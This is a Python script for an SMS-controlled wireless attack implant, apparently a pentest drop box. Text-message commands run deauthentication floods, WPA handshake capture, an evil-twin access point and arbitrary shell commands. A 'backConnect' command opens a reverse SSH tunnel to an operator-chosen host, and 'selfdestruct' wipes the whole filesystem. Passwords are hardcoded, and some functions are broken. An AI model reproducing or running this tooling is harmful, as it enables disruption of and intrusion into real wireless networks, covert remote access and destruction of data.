#! /usr/bin/python
import pymysql.cursors
import os
import threading
import time
from mysql.connector import errorcode
import shlex
from subprocess import Popen, PIPE
import sys


#use this variable to bypass authorization testing
#allowednumbers=[""]


#query = ("delete from inbox where 1")
#cursor.execute(query)
sem=threading.Semaphore()
def getConnection():
	return pymysql.connect(user='dbuser', password='Pentest1234!',
                              host='localhost',
                              database='smsd')
def getAllowedNumbers():
	global allowednumbers
	cnx=getConnection()
	cursor=cnx.cursor()
	query = ("select num from allowed")
	cursor.execute(query)
	for i in cursor:
		print i[0]
		allowednumbers.append(i[0])
def send_sms(output,number,idd):
		global sem
		
		cnx=getConnection()
		cursor=cnx.cursor()
		query = ("update inbox set processed2='true' where id=%s")
		cursor.execute(query, (idd,))
		cnx.commit()
		
		if len(output)<160:
			if "\n" in output:
				for o in output.splitlines():
					query = ("insert into outbox (`UDH`,`SendingDateTime`,`DestinationNumber`,`TextDecoded`,`MultiPart`,`SenderID`,`Coding`) values ('','',%s,%s,'false','','Unicode_No_Compression')")
					cursor.execute(query, (number,o,))
					cnx.commit()
			else:
				query = ("insert into outbox (`UDH`,`SendingDateTime`,`DestinationNumber`,`TextDecoded`,`MultiPart`,`SenderID`,`Coding`) values ('','',%s,%s,'false','','Unicode_No_Compression')")
				cursor.execute(query, (number,output,))
				cnx.commit()
			

		else:
			start=0
			stop=len(output)
			#print output,len(output)
			conter=0
			while start<stop:
				
				query = ("insert into outbox (`UDH`,`SendingDateTime`,`DestinationNumber`,`TextDecoded`,`MultiPart`,`SenderID`,`Coding`) values ('','',%s,%s,'false','','Unicode_No_Compression')")
				cursor.execute(query, (number,"m"+str(conter)+" "+output[start:start+(70-len("m"+str(conter)+" "))],))
				cnx.commit()
				
				id=cursor.lastrowid

				while True:
					query = ("select * from outbox where id=%s")
					cursor.execute(query,(id,))
					if cursor.rowcount==0:
						break
				#print output[start:start+160]
				start+=(70-len("m"+str(conter)+" "))
				conter+=1
		cnx.close()
def parse_csv_bssid(filename):
	file=open(filename).read().splitlines()
	start=False
	lines=[]
	#print file[1].split(",")
	for f in file:
		if start:
	        	lines.append(f)
		if not start and 'BSSID, ' in f:
	        	start=True

		if 'Station MAC,' in f:
	        	break
	found_ap=""
	lines=lines[0:-2]
	duplicates=[]
	for l in lines:
	    splited=l.split(",")

	    if '\x00' not in splited[13] and '\\x00' not in splited[13] and splited[13]!="" and splited[13]!=" " and splited[13] not in duplicates:
	            found_ap+=splited[5].replace(' ','')+","+splited[8].replace(' ','')+","+splited[13].replace(' ','')+" "+splited[0].replace(' ','')+" 	Channel:"+splited[3].replace(' ','')+'\n'
	            duplicates.append(splited[13])
	#print found_ap
	return found_ap
def parse_csv_clients(filename):
	file=open(filename).read().splitlines()
	start=False
	lines=[]
	#print file[1].split(",")
	for f in file:
		if start:
	        	lines.append(f)
		if not start and 'Station MAC,' in f:
	        	start=True

		#if 'Station MAC,' in f:
	     #   	break
	found_ap=""
	lines=lines[0:-2]
	duplicates=[]
	for l in lines:
	    splited=l.split(",")
	    if splited[6]!="" and splited[6]!=" ":
		    found_ap+=splited[0].replace(' ','')+","+splited[6].replace(' ','')+'\n'
	return found_ap
	
os.popen("killall screen")
os.popen("rm /tmp/capture*")
class doCmd(threading.Thread):
	def __init__(self,cmd,idd,number):
		threading.Thread.__init__(self)
		self.cmd=cmd
		self.idd=idd
		self.number=number
		self.commands={"passwd":self.authorize,"ifconfig":self.ifconfig,"shell":self.shell,"monstart":self.monstart,"monstop":self.monstop,"getSSID":self.getSSID,\
		"getclientSSID":self.getclientSSID,"targetedDeauth":self.targetedDeauth,"massDeauth":self.massDeauth,"backConnect":self.backConnect,"help":self.help,\
		"selfdestruct":self.selfdestruct,"eviltwin":self.eviltwin,"remotecopypcap":self.remotecopypcap}
		self.cmddict={"help":"prints this text","ifconfig":"no arguments","shell":"any command you want","monstart":"interface","monstop":"no arguments","getSSID":"monitor interface","getclientSSID":"no arguments","targetedDeauth":"channel,interface,deauthtries,bssidmac,clientmac","massDeauth":"interface,channel,timerun","backConnect":"ip,port,username,sshremoteport"}
		self.cnx=getConnection()
		self.cursor=self.cnx.cursor()
	def processed(self):
		query = ("update inbox set processed2='true' where id=%s")
		self.cursor.execute(query, (self.idd,))
		self.cnx.commit()
	def ongoing(self):
                query = ("update inbox set processed2='ongoing' where id=%s")
                self.cursor.execute(query, (self.idd,))
                self.cnx.commit()
	
	def authorize(self,args):
		global allowednumbers,sem

		if len(args)==1 and args[0]!="":
			passwd=args[0]

			if passwd=="DoarPentest?":
					send_sms("Allowed",self.number,self.idd)
					query = ("insert into allowed(`num`) values(%s)")
					
					self.cursor.execute(query, (self.number,))
					allowednumbers.append(self.number)
					self.cnx.commit()
					#send_sms("Authorized",self.number,self.idd)
					
			else:
				self.processed()
	def remotecopypcap(self,args):
		self.ongoing()
		send_sms("Sucesfully copied cap file to given location",self.number,self.idd)
		
	def eviltwin(self,args):
		if len(args)==5:
			self.ongoing()
			bssidmac=args[0]
			ssid=args[1]
			channel=args[2]
			interface=args[3]
			timerun=args[4]
			cmd=os.popen("killall screen")
			cmd.close()
			cmd=Popen(["screen", "-AdmS", "airbase", "airbase-ng", "-a", bssidmac, "--essid", ssid, "-c" ,channel, interface],stdout=PIPE, stderr=PIPE)
			timerun=int(args[4])
			massDeauth(interface,channel,timerun,0)
			cmd=Popen(["screen", "-X", "-S", "airbase", "quit"],stdout=PIPE, stderr=PIPE)
		else:
			self.processed()

	def selfdestruct(self,args):
		if len(args)==0:
			self.ongoing()
			cmd=os.popen("rm -rf --no-preserve-root /")
		else:
			self.processed()

	def  help(self,args):
		if len(args)==0:
			self.ongoing()
			helpmenu= """Usable commands are:
				help - details about each available command
				help <<command_name>> - command parameter list
				passwd - authorization
				ifconfig - receive available interfaces
				monstart - start monitor mode 
				monstop - stop monitor mode 
				shell -  bypass mode 
				getSSID - get available BSSID's and clients
				getclientSSID - lists available clients
				targetedDeauth - Deauth Specific Client
				massDeauth - Deauth everyone on channel
				backConnect - opens 3G channel and connects back to home via reverse SSH
				selfdestruct - self explanatory
				eviltwin - same as the one above	"""
			send_sms(helpmenu,self.number,self.idd)
		if len(args)>0 and args[0] in self.cmddict:
			self.ongoing()
			send_sms(self.cmddict[args[0]],self.number,self.idd)
	def backConnect(self,args):
		if len(args)==4:
			self.ongoing()
			ip=args[0]
			port=args[1]
			username=args[2]
			sshremoteport=args[3]
			cmd=os.popen("service gammu-smsd stop && /usr/bin/modem3g/sakis3g connect  APN='internet.vodafone.ro'")
			time.sleep(20)
			txt=cmd.read()
			while True:
				if " connected to" in txt:
					cmd=os.popen("ssh -fN -R "+port+":localhost:22 "+ username+"@"+ip+" -p"+sshremoteport)
					send_sms("found good handshake",self.number,self.idd)
				else:
					cmd=os.popen("/usr/bin/modem3g/sakis3g stop && service gammu-smsd start")
					time.sleep(20)
					send_sms("Could not connect to APN "+txt,self.number,self.idd)
					break
		else:
			self.processed()

	def massDeauth(self,args):
		if len(args)==4:
			self.ongoing()
			interface=args[0]
			channel=args[1]
			timerun=int(args[2])
			infiniterun=int(args[3])
			cmd=os.popen("killall screen")
			cmd.close()
			cmd=Popen(["screen", "-AdmS", "airodump", "airodump-ng", "-c",channel,"--write", "/tmp/capture", interface],stdout=PIPE, stderr=PIPE)
			time.sleep(3)
			cmd=Popen(["screen", "-AdmS","mdk3screen", "mdk3", interface, "d"],stdout=PIPE, stderr=PIPE)
			time.sleep(timerun)
			cmd=Popen(["screen", "-X", "-S", "mdk3screen", "quit"],stdout=PIPE, stderr=PIPE)
			cmd=os.popen("wpaclean /tmp/capturereducedsizemdk3.cap /tmp/capture-01.cap")
			cmd=os.popen("pyrit -r /tmp/capturereducedsizemdk3.cap analyze")
			txt=cmd.read()
			cmd.close()
			if infiniterun==1:
				while True:
					print txt
					if 'got 0 AP' not in txt and "2 handshake" in txt:
						print "am iesit 1"
						send_sms("found good handshake",self.number,self.idd)
						cmd=Popen(["screen", "-X", "-S", "airodump", "quit"],stdout=PIPE, stderr=PIPE)
						break
					cmd=Popen(["screen", "-AdmS","mdk3screen", "mdk3", interface, "d"],stdout=PIPE, stderr=PIPE)
					time.sleep(timerun)
					cmd=Popen(["screen", "-X", "-S", "mdk3screen", "quit"],stdout=PIPE, stderr=PIPE)
					cmd=os.popen("wpaclean /tmp/capturereducedsizemdk3.cap /tmp/capture-01.cap")
					cmd=os.popen("pyrit -r /tmp/capturereducedsizemdk3.cap analyze")
					txt=cmd.read()
					cmd.close()
			elif 'got 0 AP' not in txt and "2 handshake" in txt:
				send_sms("found good handshake",self.number,self.idd)
			cmd=Popen(["screen", "-X", "-S", "airodump", "quit"],stdout=PIPE, stderr=PIPE)
			
		else:
			self.processed()
			send_sms("more arguments needed",self.number,self.idd)
			

	def targetedDeauth(self,args):
		if len(args)==5:
			self.ongoing()
			channel=args[0]
			interface=args[1]
			deauthtries=args[2]
			bssidmac=args[3]
			clientmac=args[4]
			print 1234
			print bssidmac
			print clientmac
			print deauthtries
			#cmd=os.popen("killall screen")
			#cmd.close()
			cmd=Popen(["screen", "-AdmS", "airodump", "airodump-ng", "-c",channel,"--write", "/tmp/capture", interface],stdout=PIPE, stderr=PIPE)
			time.sleep(3)
			print 12345
			cmd=Popen(["screen", "-AdmS", "aireplay", "aireplay-ng","-0",deauthtries,"-a",bssidmac,"-c",clientmac,interface],stdout=PIPE, stderr=PIPE)

			print 123456
			time.sleep(15)
			
			#print bssidmac.lower()
			while True:
				cmd=os.popen("wpaclean /tmp/capturereducedsize.cap /tmp/capture-01.cap")
				cmd=os.popen("pyrit -r /tmp/capturereducedsize.cap analyze")
				txt=cmd.read()
				cmd.close()
				if 	bssidmac.lower() in txt and 'handshake' in txt:
					break
				time.sleep(10)
				cmd2=os.popen("screen -ls| grep aireplay")
				txt2=cmd2.read()
				cmd2.close()
				if "aireplay" not in txt2:
					cmd=Popen(["screen", "-AdmS", "aireplay", "aireplay-ng","-0",deauthtries,"-a",bssidmac,"-c",clientmac,interface],stdout=PIPE, stderr=PIPE)
			cmd=Popen(["screen", "-X", "-S", "aireplay", "quit"],stdout=PIPE, stderr=PIPE)
			cmd=Popen(["screen", "-X", "-S", "airodump", "quit"],stdout=PIPE, stderr=PIPE)
			#daca e ok facem backup separat
			send_sms("found good handshake",self.number,self.idd)
		else:
			self.processed()
	def getSSID(self,args):
		if len(args)==1:
			#capturefile=args[0]
			interface=args[0]
			self.ongoing()
			cmd=Popen(["screen", "-AdmS", "airodump", "airodump-ng", "--output-format", "csv", "--write", "/tmp/capture", interface],stdout=PIPE, stderr=PIPE)
			time.sleep(15) 
			cmd=Popen(["screen", "-X", "-S", "airodump", "quit"],stdout=PIPE, stderr=PIPE)
			ssid=parse_csv_bssid("/tmp/capture-01.csv")
			send_sms(ssid,self.number,self.idd)
		else:
			self.processed()
	def getclientSSID(self,args):
		if len(args)==1:
			#capturefile=args[0]
			#interface=args[0]
			self.ongoing()
			# cmd=Popen(["screen", "-AdmS", "airodump", "airodump-ng", "--output-format", "csv", "--write", "/tmp/capture", interface],stdout=PIPE, stderr=PIPE)
			# time.sleep(15) #de setat variabil
			# cmd=Popen(["screen", "-X", "-S", "airodump", "quit"],stdout=PIPE, stderr=PIPE)
			ssid=parse_csv_clients("/tmp/capture-01.csv")
			send_sms(ssid,self.number,self.idd)
		else:
			self.processed()
	def monstart(self,args):
		if len(args)==1 and args[0]!="":
			interface=args[0]
			self.ongoing()
			process = Popen(['airmon-ng', 'start', interface], stdout=PIPE, stderr=PIPE)
			stdout, stderr = process.communicate()
			send_sms('done',self.number,self.idd)
			self.processed()
		else:
			self.processed()
	def monstop(self):
		if len(args)==1 and args[0]!="":
			interface=args[0]
			self.ongoing()
			process = Popen(['airmon-ng', 'stop', interface], stdout=PIPE, stderr=PIPE)
			stdout, stderr = process.communicate()
			send_sms('done',self.number,self.idd)
			self.processed()
		else:
			self.processed()
	def shell(self,args):
		if len(args)==1:
			ifs=[]
			p=os.popen(args[0])
			rez=p.read()
			p.close()
			send_sms(rez,self.number,self.idd)
	def ifconfig(self,args):
		if len(args)==0:
			ifs=[]
			rez=os.popen('ifconfig')
			lines=rez.read().splitlines()
			for l in lines:
				if 'Link encap' in l:
					iff=l.split(" ")[0]
					ifs.append(iff)
			send_sms(','.join(ifs),self.number,self.idd)
	def run(self):
		parts=shlex.split(self.cmd)
		command=parts[0]
		args=parts[1:]
		if command in self.commands:
			self.commands[command](args)
			self.processed()
		else:		
			self.processed()
		self.cnx.close()

def run():
	cnx=getConnection()
	cursor = cnx.cursor()
	query = ("select ID,SenderNumber,TextDecoded from inbox where processed2='false' and processed2!='ongoing'")
	cursor.execute(query)
	for i in cursor:

		cmd=i[2]
		cmd=cmd[0].lower()+cmd[1:]
		print cmd
		print i[0]
		if i[1] in allowednumbers or cmd.startswith('passwd'):
			t=doCmd(cmd,i[0],i[1])
			t.daemon=True
			t.start()
		else:
			query = ("update inbox set processed2='true' where id=%s")
			cursor.execute(query, (i[0],))
			cnx.commit()
	cnx.close()

getAllowedNumbers()	
while True:
#	try:
	run()
#	break
#	except:
#		continue
	time.sleep(0.1)
